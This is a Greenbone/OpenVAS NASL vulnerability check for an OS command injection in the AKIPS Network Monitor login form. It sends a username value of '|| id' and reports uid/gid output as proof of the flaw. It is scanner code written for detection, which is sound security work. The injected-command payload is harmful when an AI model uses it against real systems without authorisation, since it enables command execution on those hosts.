# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:akips:network_monitor";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105579");
  script_version("2025-03-21T05:38:29+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_name("AKIPS Network Monitor OS Command Injection");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39564/");

  script_tag(name:"vuldetect", value:"Try to execute the `id' command.");
  script_tag(name:"insight", value:"The 'username' login parameter allows for OS Command injection via command Injection
  during a failed login attempt returns the command injection output to a limited login failure field.");
  script_tag(name:"solution", value:"Update to AKIPS Network Monitor 16.6 or newer");
  script_tag(name:"summary", value:"AKIPS Network Monitor is prone to an OS Command Injection");
  script_tag(name:"affected", value:"AKIPS Network Monitor 15.37 through 16.5");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"2025-03-21 05:38:29 +0000 (Fri, 21 Mar 2025)");
  script_tag(name:"creation_date", value:"2016-03-17 17:39:33 +0100 (Thu, 17 Mar 2016)");
  script_category(ACT_GATHER_INFO);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_dependencies("gb_akips_network_monitor_detect.nasl");
  script_require_ports("Services/www", 80, 443);
  script_mandatory_keys("akips_network_monitor/installed");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

data = "username=%7C%7C+id&password=";
req = http_post_put_req( port:port, url:"/", data:data, add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
buf = http_send_recv( port:port, data:req, bodyonly:FALSE ); # do not change this. server behaves strange...

if( buf =~ "uid=[0-9]+.*gid=[0-9]+" ) {
  report = "It was possible to execute the `id' command on the remote host.";
  uid = eregmatch( pattern:'(uid=[0-9]+.*gid=[0-9]+[^<]+)', string:buf );
  if( uid[1] )
    report += '\nResult:\n\n' + uid[1];

  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
